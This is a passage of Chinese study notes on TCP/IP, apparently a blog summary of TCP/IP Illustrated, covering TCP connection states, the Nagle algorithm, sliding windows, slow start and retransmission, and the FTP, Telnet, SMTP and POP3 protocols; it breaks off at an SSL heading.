<p>注意：MSL是个有限的时间，我们知道TCP报文段以IP数据报在网络中传输，IP数据报是由TTL字段限制其生存时间的。RFC 793指出MSL为2分钟。实现中的常用值是30秒，1分钟，或2分钟。</p>
<p>对于给定的MSL值，原则是：当TCP执行一个主动关闭，并发回最后一个ACK，该连接必须在TIME_WAIT状态停留的时间为2倍的MSL。这样可让TCP再次发送最后的ACK以防这个ACK丢失（另一端超时并重发最后的FIN）。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242008047654027.png" alt=""></p>
<p>说明：</p>
<p>1）客户执行主动关闭并进入TIME_WAIT是正常的。服务器通常执行被动关闭，不会进入TIME_WAIT状态。</p>
<p>2）TCP连接在2MSL等待期间，这个连接的socket（客户的IP地址和端口号，服务器的IP地址和端口号）不能再被使用。这个连接只能在2MSL结束后才能再被使用。</p>
<h3 id="平静时间的概念"><a href="#平静时间的概念" class="headerlink" title="平静时间的概念"></a>平静时间的概念</h3><p>如果处于2MSL等待端口的主机出现故障，它会在MSL秒内重新启动，并立即使用故障前处于2MSL的socket来建立一个新的连接。在故障前从这个连接发出而迟到的报文段会被错误地当作属于重启后新连接的报文段。</p>
<p>为了防止这种情况，RFC 793指出TCP在重启动后的MSL秒内不能建立任何连接，称为平静时间(quiet time)。</p>
<h3 id="FIN-WAIT-2状态"><a href="#FIN-WAIT-2状态" class="headerlink" title="FIN_WAIT_2状态"></a>FIN_WAIT_2状态</h3><p>如上面的图所示：FIN_WAIT_2状态时，客户已经发出了FIN，另一端也已对它进行确认。</p>
<p>除非客户设置了半关闭，否则将等待另一端的应用层意识到它已收到一个文件结束符说明，并向我们发一个FIN 来关闭连接。只有这样，我们这端才会从FIN_WAIT_2状态进入TIME_WAIT状态。</p>
<h2 id="复位报文段"><a href="#复位报文段" class="headerlink" title="复位报文段"></a>复位报文段</h2><p>TCP首部中的RST比特是用于“复位”的，一般无论何时一个报文段发往“基准连接”出现错误，TCP都会发出一个复位报文段。</p>
<p>说明：“基准连接”是指由目的IP地址和端口号以及源IP地址和端口号指明的连接。</p>
<h3 id="到不存在的端口的连接请求"><a href="#到不存在的端口的连接请求" class="headerlink" title="到不存在的端口的连接请求"></a>到不存在的端口的连接请求</h3><p>产生复位的一种常见情况是当连接请求到达时，目的端口没有进程正在听。</p>
<p>注意：对于UDP，当一个数据报到达目的端口时，该端口没在使用，它将产生一个ICMP端口不可达的信息；对于TCP，则使用复位。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242052314061888.png" alt=""></p>
<p>图中的意思是说：主机bsdi向svr4的20000端口发送SYN，然后svr4告诉bsdi一个复位连接的信息。</p>
<h3 id="异常终止一个连接"><a href="#异常终止一个连接" class="headerlink" title="异常终止一个连接"></a>异常终止一个连接</h3><p>终止一个连接的正常方式是一方发送FIN。这也称为有序释放，因为在所有排队数据都已发送之后才发送FIN，正常情况下没有任何数据丢失。但也有可能发送一个复位报文段而不是FIN来中途释放一个连接。这也称为为异常释放。</p>
<p>异常终止一个连接对应用程序来说有两个优点：</p>
<p>1）丢弃任何待发数据并立即发送复位报文段；</p>
<p>2）RST的接收方会区分另一端执行的是异常关闭还是正常关闭。</p>
<p>特别注意：RST报文段不会导致另一端产生任何响应，另一端根本不进行确认。收到RST的一方将终止该连接，并通知应用层连接复位。</p>
<h3 id="检测半打开连接"><a href="#检测半打开连接" class="headerlink" title="检测半打开连接"></a>检测半打开连接</h3><p>如果一方已经关闭或异常终止连接而另一方却还不知道，将这样的TCP连接称为半打开的。</p>
<p>说明：</p>
<p>1）任何一端的主机异常都可能导致半打开连接。只要不在半打开连接上传输数据，仍处于连接状态的一方就不会检测到另一方已经出现异常。</p>
<p>2）半打开连接的另一个常见原因是当客户主机突然掉电而不是正常的结束客户应用程序后再关机。</p>
<h2 id="同时打开"><a href="#同时打开" class="headerlink" title="同时打开"></a>同时打开</h2><p>两个应用程序同时彼此执行主动打开的情况是可能的，尽管发生的可能性极小。每一方必须发送一个SYN，且这些SYN必须传递给对方。这需要每一方使用一个对方熟知的端口作为本地端口，称为同时打开。</p>
<p>TCP对于同时打开仅建立一条连接而不是两条连接。当出现同时打开时：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242113260463855.png" alt=""></p>
<p>两端几乎同时发送SYN，并进入SYN_SENT状态。当每一端收到SYN时，状态变为SYN_RCVD，同时它们都再发SYN并对收到的SYN进行确认。当双方都收到SYN及相应的ACK时，状态都变迁为ESTABLISHED。</p>
<p>注意：</p>
<p>（1）一个同时打开的连接需要交换4个报文段，比正常的三次握手多一个。</p>
<p>（2）对于同时打开的连接，我们没有将任何一端称为客户或服务器，因为每一端既是客户又是服务器。</p>
<h2 id="同时关闭"><a href="#同时关闭" class="headerlink" title="同时关闭"></a>同时关闭</h2><p>双方都执行主动关闭也是可能的，TCP也允许同时关闭。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242119433438389.png" alt=""></p>
<p>同时关闭过程为：</p>
<p>（1）当应用层发出关闭命令时，两端均从ESTABLISHED变为FIN_WAIT_1。这将导致双方各发送一个FIN，两个FIN经过网络传送后分别到达另一端。</p>
<p>（2）收到FIN后，状态由FIN_WAIT_1变为CLOSING，并发送最后的ACK。</p>
<p>（3）当收到最后的ACK时，状态变化为TIME_WAIT。</p>
<p>注意：同时关闭和正常关闭报文段交换数目相同。</p>
<h2 id="TCP选项"><a href="#TCP选项" class="headerlink" title="TCP选项"></a>TCP选项</h2><p>TCP首部可以包含选项部分。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242127116875983.png" alt=""></p>
<p>选项说明：</p>
<p>（1）每个选项的开始是1字节kind字段，说明选项的类型。</p>
<p>（2）kind字段为0和1的选项仅占1个字节。其他选项在kind字节后还有len字节，它说明的长度是指总长度，包括kind字节和len字节。</p>
<p>（3）设置无操作选项的原因在于允许发方填充字段为4字节的倍数。</p>
<h1 id="TCP的交互数据流"><a href="#TCP的交互数据流" class="headerlink" title="TCP的交互数据流"></a>TCP的交互数据流</h1><h2 id="引言-6"><a href="#引言-6" class="headerlink" title="引言"></a>引言</h2><p>有关TCP通信量的研究发现：按分组数量计算，约有一半的TCP报文段包含成块数据（如FTP、电子邮件和Usenet新闻），另一半则包含交互数据（如Telnet和Rlogin）。按字节计算，成块数据与交互数据的比例约为90%和10%。</p>
<p>成块数据的报文段基本上都是满长度的（通常为512字节的用户数据），交互数据则小得多（Telnet和Rlogin分组中约90%左右的用户数据小于10个字节）</p>
<p>TCP需要同时处理这两类数据，但使用的处理算法不同。</p>
<h2 id="交互式输入"><a href="#交互式输入" class="headerlink" title="交互式输入"></a>交互式输入</h2><p>说明：本书是以远程登录Rlogin协议模拟交互输入的，我没有进行相关实验，下面我会给出作者所做的实验截图。</p>
<p>如图19-1所示，Rlogin协议需要远程系统回显客户输入的字符，每按一个字符就会产生一个分组，而不是每次一行作为一个分组。</p>
<p>一般可以将报文段2和3合并（图中两个红框）</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271740550057766.png" alt=""></p>
<p>当我们键入5个字符date\n时的数据流，如图19-2所示：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271750297082325.png" alt=""></p>
<p>说明：</p>
<p>（1）第1行：客户发送字符d到服务器；第2行：该字符的确认及回显；第3行：回显字符的确认。</p>
<p>（2）与字符a有关的是第4~6行，与字符t有关的是第7~9行，与字符e有关的是第10~12行。</p>
<p>（3）13~15行与上面稍有不同。客户发送到服务器的是一个字符（换行符），而回显的是两个字符（图中14行红线处），这两个字符为：回车和换行字符，作用是将光标移动到左边并换到下一行。</p>
<p>（4）第16行：来自服务器date命令的输出。这30个字节（图中红线处）由28个字符与最后的回车+换行组成。第17、18行：服务器发往客户7个字符（第18行），它们是在服务器主机上的客户提示符：svr4%。第19行：确认了这7个字符。</p>
<h2 id="经受时延的确认"><a href="#经受时延的确认" class="headerlink" title="经受时延的确认"></a>经受时延的确认</h2><p>图19-3表示了图19-2中数据交换的时间。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271808466309708.png" alt=""></p>
<p>通常TCP在接收到数据时并不立即发送ACK；它会推迟发送，以便将ACK与需要沿该方向发送的数据一起发送，有时称这种现象为数据捎带ACK。</p>
<p>说明：绝大多数实现采用的时延为200ms，即TCP将以最大200ms的时延等待是否有数据一起发送。</p>
<p>下面我假设你会看这张图中标记的时间差，会计算实际时间（累加）。说明如下：</p>
<p>观察bsdi接收到数据和发送ACK之间的时间差：123.5、65.6、109.0、132.2、42.0、140.3和195.8 ms，似乎是随机的。观察bsdi发送ACK的实际时间（从0开始计算）为：139.9、539.3、940.1、1339.9、1739.9、1940.1和2140.1 ms，这些时间差是200ms的整数倍。</p>
<p>注意：因为TCP使用了一个200ms的定时器，以相对于内核引导的200ms固定时间溢出。由于将要确认的数据是随机到达的，TCP在内核的200ms定时器的下一次溢出时得到通知。</p>
<h2 id="Nagle算法"><a href="#Nagle算法" class="headerlink" title="Nagle算法"></a>Nagle算法</h2><p>Rlogin连接时，一般每次发送一个字节到服务器，这就产生了一些41字节长的分组：20字节的IP首部、20字节的TCP首部和1个字节的数据。</p>
<p>在局域网上，这些小分组（被称为微小分组tinygram）通常不会引起麻烦，因为局域网一般不会出现拥塞。在广域网上，这些小分组则会增加拥塞出现的可能。一种简单有效的方法就是采用RFC 896建议的Nagle算法。</p>
<p>算法说明：</p>
<p>算法要求一个TCP连接上最多只能有一个未被确认的未完成的小分组，在该分组的确认到达之前不能发送其他的小分组。相反，TCP收集这些少量的分组，并在确认到来时以一个分组的方式发出去。</p>
<p>算法优点：</p>
<p>算法的优越之处在于它是自适应的：确认到达得越快，数据也就发送得越快。在希望减少微小分组数目的低速广域网上，则会发送更少的分组。</p>
<p>从图19-3中看到，在以太网上一个字节被发送、确认和回显的平均往返时间约为16ms。为了产生比这个速度更快的数据，我们每秒键入的字符必须多于60个。说明在局域网环境下两个主机之间发送数据时很少使用这个算法。</p>
<p>当往返时间（RTT）增加时，如通过一个广域网，情况发生了变化。如图19-4：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271843132408414.png" alt=""></p>
<p>从左到右待发数据的长度是不同的，分别为：1、1、2、1、2、2、3、1和3个字节。这是因为客户只有收到前一个数据的确认后才发送已经收集的数据。通过使用Nagle算法，为发送16个字节的数据客户只需要使用9个报文段，而不再是16个。</p>
<p>关闭Nagle算法</p>
<p>有时我们也需要关闭Nagle算法。例如，X窗口系统服务器，小消息（鼠标移动）必须无时延地发送，以便为进行某种操作的交互用户提供实时的反馈。</p>
<h2 id="窗口大小通告"><a href="#窗口大小通告" class="headerlink" title="窗口大小通告"></a>窗口大小通告</h2><p>观察图19-4，可以看到slip通告窗口大小为4096字节，vangogh通告其窗口大小为8192字节。但报文段5通告的窗口大小为4095个字节，意味着TCP缓冲区中仍然有一个字节等待应用程序（Rlogin客户）读取。</p>
<p>说明：</p>
<p>（1）通常服务器通告窗口大小为8192个字节，这是因为服务器在读取并回显接收到的数据之前，其TCP没有数据发送。当服务器已经读取了来自客户的输入后，来自服务器的数据将被发送。</p>
<p>（2）在ACK到来时，客户的TCP总是有数据需要发送。这是因为它在等待ACK的过程中缓存接收到的字符。当客户TCP发送缓存的数据时，Rlogin客户没有机会读取来自服务器的数据，因此，客户通告的窗口大小总是小于4096。</p>
<h1 id="TCP的成块数据流"><a href="#TCP的成块数据流" class="headerlink" title="TCP的成块数据流"></a>TCP的成块数据流</h1><h2 id="正常数据流"><a href="#正常数据流" class="headerlink" title="正常数据流"></a>正常数据流</h2><ul>
<li>通常使用的“隔一个报文段确认”的策略</li>
<li>分组顺序依赖于许多无法控制的因素：发送方T C P的实现、接收方T C P的实现、接收进程读取数据（依赖于操作系统的调度）和网络的动态性（如以太网的冲突和退避等）。</li>
</ul>
<h3 id="快的发送方和慢的接收方"><a href="#快的发送方和慢的接收方" class="headerlink" title="快的发送方和慢的接收方"></a>快的发送方和慢的接收方</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501153726.jpg" alt=""></p>
<ul>
<li>发送方发送4个背靠背（b a c k - t o - b a c k）的数据报文段去填充接收方的窗口，然后停下来等待一个A C K。接收方发送A C K（报文段8），但通告其窗口大小为 0，这说明接收方已收到所有数据，但这些数据都在接收方的 T C P缓冲区，因为应用程序还没有机会读取这些数据。</li>
<li>另一个A C K（称为窗口更新）在17.4 ms后发送，表明接收方现在可以接收另外的 4 0 9 6个字节的数据。虽然这看起来像一个 A C K，但由于它并不确认任何新数据，只是用来增加窗口的右边沿，因此被称为窗口更新。</li>
<li>发送方发送最后4个报文段（1 0 ~ 1 3），再次填充了接收方的窗口。注意到报文段 1 3中包括两个比特标志：P U S H和F I N。随后从接收方传来另外两个 A C K，它们确认了最后的4 0 9 6字节的数据（从4 0 9 7到8 1 9 2字节）和F I N（标号为8 1 9 2）。</li>
</ul>
<h2 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501153825.jpg" alt=""></p>
<ul>
<li>在这个图中，我们将字节从 1至11进行标号。接收方通告的窗口称为提出的窗口（ o ff e r e dw i n d o w），它覆盖了从第4字节到第9字节的区域，表明接收方已经确认了包括第 3字节在内的数据，且通告窗口大小为 6。回顾第1 7章，我们知道窗口大小是与确认序号相对应的。发送方计算它的可用窗口，该窗口表明多少数据可以立即被发送。</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501154500.jpg" alt=""></p>
<ul>
<li>当接收方确认数据后，这个滑动窗口不时地向右移动。窗口两个边沿的相对运动增加或减少了窗口的大小。使用三个术语来描述窗口左右边沿的运动：<br>1) 称窗口左边沿向右边沿靠近为窗口合拢。这种现象发生在数据被发送和确认时。<br>2) 当窗口右边沿向右移动时将允许发送更多的数据，我们称之为窗口张开。这种现象发生在另一端的接收进程读取已经确认的数据并释放了 T C P的接收缓存时。<br>3) 当右边沿向左移动时，我们称之为窗口收缩。 Host Requirements RFC强烈建议不要使用这种方式。但T C P必须能够在某一端产生这种情况时进行处理</li>
</ul>
<h3 id="一个例子-1"><a href="#一个例子-1" class="headerlink" title="一个例子"></a>一个例子</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501155029.jpg" alt=""></p>
<p>以该图为例可以总结如下几点：<br>1) 发送方不必发送一个全窗口大小的数据。<br>2) 来自接收方的一个报文段确认数据并把窗口向右边滑动。这是因为窗口的大小是相对于确认序号的。<br>3) 正如从报文段7到报文段8中变化的那样，窗口的大小可以减小，但是窗口的右边沿却不能够向左移动。<br>4) 接收方在发送一个A C K前不必等待窗口被填满。在前面我们看到许多实现每收到两个报文段就会发送一个A C K。</p>
<h2 id="PUSH标志"><a href="#PUSH标志" class="headerlink" title="PUSH标志"></a>PUSH标志</h2><p>发送方使用该标志通知接收方将所收到的数据全部提交给接收进程。这里的数据包括与 P U S H一起传送的数据以及接收方T C P已经为接收进程收到的其他数据。</p>
<h2 id="慢启动"><a href="#慢启动" class="headerlink" title="慢启动"></a>慢启动</h2><ul>
<li>发送方一开始便向网络发送多个报文段，直至到达接收方通告的窗口大小为止。当发送方和接收方处于同一个局域网时，这种方式是可以的。但是如果在发送方和接收方之间存在多个路由器和速率较慢的链路时，就有可能出现一些问题。一些中间路由器必须缓存分组，并又可能耗尽存储器的空间，然后发生丢包</li>
<li>TCP采用“慢启动（slow start）”算法来降低一开始就发送过多的数据到网络</li>
<li>慢启动为发送方的T C P增加了另一个窗口：拥塞窗口(congestion window)，记为c w n d。当与另一个网络的主机建立 T C P连接时，拥塞窗口被初始化为 1个报文段（即另一端通告的报文段大小）。每收到一个A C K，拥塞窗口就增加一个报文段（ c w n d以字节为单位，但是慢启动以报文段大小为单位进行增加）。发送方取拥塞窗口与通告窗口中的最小值作为发送上限。拥塞窗口是发送方使用的流量控制，而通告窗口则是接收方使用的流量控制。</li>
<li>发送方开始时发送一个报文段，然后等待 A C K。当收到该A C K时，拥塞窗口从1增加为2，即可以发送两个报文段。当收到这两个报文段的 A C K时，拥塞窗口就增加为4。这是一种指数增加的关系。</li>
<li>在某些点上可能达到了互联网的容量，于是中间路由器开始丢弃分组。这就通知发送方它的拥塞窗口开得过大。当我们在下一章讨论 T C P的超时和重传机制时，将会看到它们是怎样对拥塞窗口起作用的。现在，我们来观察一个实际中的慢启动。</li>
</ul>
<h2 id="发送一个分组的时间"><a href="#发送一个分组的时间" class="headerlink" title="发送一个分组的时间"></a>发送一个分组的时间</h2><ul>
<li>通常发送一个分组的时间取决于两个因素：传播时延和发送时延</li>
<li>对于一个给定的两个接点之间的同路，传播时延一般是固定的，而发送时延则取决于分组大小</li>
<li>在速率较慢的情况下发送时延起主要作用，而在千兆比特速率下传播时延则占主要地位</li>
</ul>
<h2 id="带宽时延乘积"><a href="#带宽时延乘积" class="headerlink" title="带宽时延乘积"></a>带宽时延乘积</h2><ul>
<li>为了最大限度的利用链路带宽，必须确保发送发源源不断的收到接收方发送的ACK，做为收到数据的确认和更新window size的大小</li>
<li>在开始阶段，通告的window size必须大于等于带宽和往返时延的乘积，才能确保在收到第一个ACK前，能够一直发送数据流量。因为发送第一个数据报文到收到对应的ACK，时间至少RTT时间</li>
<li>计算通道的容量为：<br>c a p a c i t y (bit) = b a n d w i d t h (b/s) × ro u n d-trip time ( s )</li>
</ul>
<h1 id="TCP的超时重传"><a href="#TCP的超时重传" class="headerlink" title="TCP的超时重传"></a>TCP的超时重传</h1><p>T C P提供可靠的运输层。它使用的方法之一就是确认从另一端收到的数据。但数据和确认都有可能会丢失。 T C P通过在发送时设置一个定时器来解决这种问题。如果当定时器溢出时还没有收到确认，它就重传该数据</p>
<p>对每个连接，T C P管理4个不同的定时器。<br>1) 重传定时器使用于当希望收到另一端的确认。在本章我们将详细讨论这个定时器以及<br>一些相关的问题，如拥塞避免。<br>2) 坚持( p e r s i s t )定时器使窗口大小信息保持不断流动，即使另一端关闭了其接收窗口<br>3) 保活( k e e p a l i v e )定时器可检测到一个空闲连接的另一端何时崩溃或重启<br>4) 2MSL定时器测量一个连接处于 T I M E _ WA I T状态的时间。</p>
<h1 id="FTP：文件传送协议"><a href="#FTP：文件传送协议" class="headerlink" title="FTP：文件传送协议"></a>FTP：文件传送协议</h1><h2 id="FTP简介"><a href="#FTP简介" class="headerlink" title="FTP简介"></a>FTP简介</h2><ul>
<li>数据传输主流协议</li>
<li>两个信道<ul>
<li>第一信道，控制信道，无论何时都是由客户端发起连接。采用客户端服务器模式。服务端监听21端口。用于控制命令的传输。主要任务就是认证，控制命令（如查看文件列表等）等</li>
<li>第二信道，数据信道。根据数据信道是否由服务端发起，区分ActiveMode和PassiveMode。数据的传输走的是第二信道，包括文件列表数据的传输。</li>
<li>TCP的知名端口号（服务端的监听端口），21号，是控制信道的端口。</li>
</ul>
</li>
<li>FTP两个模式<ul>
<li>Active Mode</li>
<li>Passive Mode</li>
</ul>
</li>
</ul>
<h2 id="FTP命令"><a href="#FTP命令" class="headerlink" title="FTP命令"></a>FTP命令</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010583_4654.png" alt=""></p>
<h2 id="Active-Mode"><a href="#Active-Mode" class="headerlink" title="Active Mode"></a>Active Mode</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010584_5069.png" alt=""></p>
<ul>
<li>第一信道通常三次握手建立FTP连接</li>
<li>第二信道（数据信道），是由服务器主动发起的，即是ActiveMode。</li>
<li>第二信道（数据通道），是服务器被动接收的，即是PassiveMode。</li>
<li>可见，第二信道，即数据信道（传输数据而非控制命令），是由服务端主动发起的，即是主动模式（ActiveMode）；如果不是服务器主动发起的，即是被动模式（PassiveMode）。</li>
<li>第一信道中，客户端向FTP服务器发送的数据中，含有PORT（a,b,c,d,e,f）这里a,b,c,d,e,f每上表示0~255的数据，其中a,b,c,d表示客户端的IP，e,f表示客户端的第二通道的端口（计算方法是：e*256+f）。这主要是为了供第二通道中，服务端主动发起向客户端的连接使用的。</li>
</ul>
<h2 id="安全性-1"><a href="#安全性-1" class="headerlink" title="安全性"></a>安全性</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010584_9056.png" alt=""><br>注意：由于用户名和密码都是明文传输，易于被截获，因此，对于FTP来说，使用匿名登陆反而更安全。</p>
<h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010585_6448.png" alt=""><br>客户端第二通道是IP和端口是： 202.100.1.100,4<em>256+38<br>第一次传入PORT后，紧跟的是一个控制命令，LIST（查看列表）。<br>然后，服务端20号端口通过第二信道与客户端的4</em>256+38端口建立连接，并传送文件列表。</p>
<h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010601_6947.png" alt=""><br>当单击文件列表中的一个文件，又出现了一个PORT发给服务端（注意这次的端口号有变化，4<em>256+42），接着又发了一个RETR命令，后面跟着所请求的文件。<br>这时，服务端20号端口又通过第二信道与客户端4</em>256+42端口建立连接，并传送该文件。（注意，与第一次不是同一个端口号，也就是说又建立了一次连接）<br>注意：这里是又建立了一次连接。</p>
<h2 id="Passive-Mode"><a href="#Passive-Mode" class="headerlink" title="Passive Mode"></a>Passive Mode</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010602_9427.png" alt=""><br>第二信道，服务器被动接受为被动模式（PassiveMode）。<br>在第一信道中，客户端发送PASV命令，询问服务端是否支持被动模式。服务端回复227表示支持，这时a,b,c,d,e,f表示服务端第二信道的IP和端口。<br>目前一般使用的是PassiveMode模式，客户端连接后，一般会发PASV询问服务器是否支持PassiveMode，如果支持，则使用PassiveMode。</p>
<h1 id="Telnet：远程登录"><a href="#Telnet：远程登录" class="headerlink" title="Telnet：远程登录"></a>Telnet：远程登录</h1><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501205934.jpg" alt=""></p>
<ul>
<li>1) Te l n e t客户进程同时和终端用户和T C P / I P协议模块进行交互。通常我们所键入的任何信息的传输是通过T C P连接，连接的任何返回信息都输出到终端上。</li>
<li>Te l n e t服务器进程经常要和一种叫做“伪终端设备”（pseudo-terminal device）打交道，至少在U n i x系统下是这样的。这就使得对于登录外壳 ( s h e l l )进程来讲，它是被Te l n e t服务器进程直接调用的，而且任何运行在登录外壳进程处的程序都感觉是直接和一个终端进行交互。</li>
<li>仅仅使用了一条T C P连接。由于客户进程必须多次和服务器进程进行通信（反之亦然），这就必然需要某些方法，来描绘在连接上传输的命令和用户数据。</li>
</ul>
<h2 id="Telnet协议"><a href="#Telnet协议" class="headerlink" title="Telnet协议"></a>Telnet协议</h2><p>Te l n e t协议可以工作在任何主机（例如，任何操作系统）或任何终端之间。    </p>
<h2 id="NVT-ASCII"><a href="#NVT-ASCII" class="headerlink" title="NVT ASCII"></a>NVT ASCII</h2><ul>
<li>术语NVT ASCII代表7比特的A S C I I字符集，网间网协议族都使用NVT ASCII。每个7比特的字符都以8比特格式发送，最高位比特为0。</li>
<li>行结束符以两个字符 C R（回车）和紧接着的 L F（换行）这样的序列表示。以 \ r \ n来表示。单独的一个 C R也是以两个字符序列来表示，它们是 C R和紧接着的 N U L（字节0），以\ r \ 0表示。</li>
<li>F T P, SMTP, Finger和W h o i s协议都以NVT ASCII来描述客户命<br>令和服务器的响应。</li>
</ul>
<h2 id="Telnet命令"><a href="#Telnet命令" class="headerlink" title="Telnet命令"></a>Telnet命令</h2><p>Te l n e t通信的两个方向都采用带内信令方式。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501210711.jpg" alt=""></p>
<h2 id="一次一个字符方式"><a href="#一次一个字符方式" class="headerlink" title="一次一个字符方式"></a>一次一个字符方式</h2><p>我们所键入的每个字符都单独发送到服务器进程。服务器进程回显大多数的字符，除非服务器进程端的应用程序去掉了回显功能。该方式的缺点也是显而易见的。当网络速度很慢，而且网络流量比较大的时候，那么回显的速度也会很慢。虽然如此，但目前大多数 Te l n e t实现都把这种方式作为默认方式。</p>
<h2 id="Telnet协议两大特点"><a href="#Telnet协议两大特点" class="headerlink" title="Telnet协议两大特点"></a>Telnet协议两大特点</h2><ul>
<li>交互式TCP数据流的特点</li>
<li>安全问题（替代协议SSH）</li>
</ul>
<h1 id="SMTP-POP3：简单邮件传送协议-邮局协议版本3"><a href="#SMTP-POP3：简单邮件传送协议-邮局协议版本3" class="headerlink" title="SMTP/POP3：简单邮件传送协议/邮局协议版本3"></a>SMTP/POP3：简单邮件传送协议/邮局协议版本3</h1><h2 id="SMTP简介"><a href="#SMTP简介" class="headerlink" title="SMTP简介"></a>SMTP简介</h2><ul>
<li>SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议,它是一组用于由源地址到目的地址传送邮件的规则，由它来控制信件的中转方式。SMTP协议属于TCP/IP协议簇，它帮助每台计算机在发送或中转信件时找到下一个目的地。通过SMTP协议所指定的服务器,就可以把E-mail寄到收信人的服务器上了，整个过程只要几分钟。SMTP服务器则是遵循SMTP协议的发送邮件服务器，用来发送或中转发出的电子邮件。</li>
<li>SMTP 是一种TCP协议支持的提供可靠且有效电子邮件传输的应用层协议。SMTP 是建立在 TCP上的一种邮件服务，主要用于传输系统之间的邮件信息并提供来信有关的通知。[1] </li>
<li>端口 25</li>
</ul>
<h2 id="SMTP协议的邮件路由过程"><a href="#SMTP协议的邮件路由过程" class="headerlink" title="SMTP协议的邮件路由过程"></a>SMTP协议的邮件路由过程</h2><p>STMP服务器基于域名服务器DNS中计划收件人的域名来路由电子邮件。SMTP服务器基于DNS的MX记录来路由电子邮件，都应向该主机发送。若SMTP服务器mail.abc.com收到一封信要发到shuer@sh.abc.com，则执行以下过程：</p>
<ul>
<li>Sendmail请求DNS给出主机sh.abc.com的CNAME记录，如有，假若CNAME（别名记录）到shmail.abc.com，则再次请求shmail.abc.com的CNAME的记录，直到没有为止</li>
<li>假定被CNAME到shmail.abc.com，然后sendmail请求@abc.com域的DNS给出shmail.abc.com的MX记录（邮件路由及记录），shmail MX 5 shmail.abc.com 10 shmail2.abc.com</li>
<li>Sendmail组合请求DNS给出shmail.abc.com的A记录（主机名或域名对应的IP地址记录），即IP地址，若返回值为1.2.3.4（假设值）</li>
<li>Sendmail与1.2.3.4连接，传送这封给shuser@sh.abc.com的信到1.2.3.4这台服务器的SMTP后台程序</li>
</ul>
<h2 id="SMTP协议工作原理"><a href="#SMTP协议工作原理" class="headerlink" title="SMTP协议工作原理"></a>SMTP协议工作原理</h2><p>SMTP是工作在两种情况下：一是电子邮件从客户机传输到服务器；二是从某一个服务器传输到另一个服务器。SMTP也是个请求/响应协议，命令和响应都是基于ASCII文本，并以CR和LF符结束。响应包括一个表示返回状态的三位数字代码。SMTP在TCP协议25号端口监听连续请求。<br>连接和发送过程如下：</p>
<ul>
<li>建立TCP连接</li>
<li>客户端发送HELO命令以标识发件人自己的身份，然后客户端发送MAIL命令；服务器正希望以OK作为响应，表明准备接收</li>
<li>客户端发送RCPT命令，以标识该电子邮件的计划接收人，可以有多个RCPT行；服务器端则表示是否愿意为收件人接收邮件</li>
<li>协商结束，发送邮件，用命令DATA发送</li>
<li>以“.”号表示结束输入内容一起发送出去，结束此次发送，用QUIT命令退出</li>
</ul>
<h2 id="SMTP-Inspection介绍"><a href="#SMTP-Inspection介绍" class="headerlink" title="SMTP Inspection介绍"></a>SMTP Inspection介绍</h2><ul>
<li><p>Allow only seven minimum SMTP<br>commands:helo,mail,rcpt,data,rset,noop,and,quit(RFC 821)</p>
</li>
<li><p>Adds support for eight ESMTP<br>commands:auth,data,ehlo,etrn,saml,send,soml,and vrfy</p>
</li>
<li><p>默认在TCP/25上激活了ESMTP监控</p>
</li>
<li>如果禁用此功能，所有SMTP命令都能穿越防火墙，邮件服务器潜在的漏洞就暴露在攻击者面前</li>
</ul>
<h2 id="POP简介"><a href="#POP简介" class="headerlink" title="POP简介"></a>POP简介</h2><ul>
<li>POP3，全名为“Post Office Protocal-Version3”，即“邮局协议版本3”。是TCP/IP协议族中的一员，由RFC1939定义。本协议主要用于支持使用客户端远程管理在服务器上的电子邮件。提供SSL加密的POP3协议被称为POP3S.</li>
<li>POP协议支持“离线”邮件处理。其具体过程是：邮件发送到服务器上，电子邮件客户端调用邮件客户机程序以连接服务器，并下载所有未阅读的电子邮件，这种离线访问模式是一种存储转发服务，将邮件从邮件服务器端发送到个人终端机器上，一般是PC机或MAC。一旦邮件发送到PC机或MAC上，邮件服务器上的邮件将会被删除。但目前的POP3邮件服务器大都可以“只下载邮件，服务器端并不删除”,也就是改进的POP3协议</li>
<li>传输协议：TCP/110</li>
</ul>
<h2 id="POP命令"><a href="#POP命令" class="headerlink" title="POP命令"></a>POP命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">USER			//键入用户名</div><div class="line">PASS			//键入密码</div><div class="line">STAT			//查看服务器状态</div><div class="line">List			//罗列邮件</div><div class="line">RETR 1			//收ID为1的邮件</div></pre></td></tr></table></figure>
<h1 id="SSL：安全套接层"><a href="#SSL：安全套接层" class="headerlink" title="SSL：安全套接层"></a>SSL：安全套接层</h1><h2 id="SSL简介"><a href="#SSL简介" class="headerlink" title="SSL简介"></a>SSL简介</h2><ul>
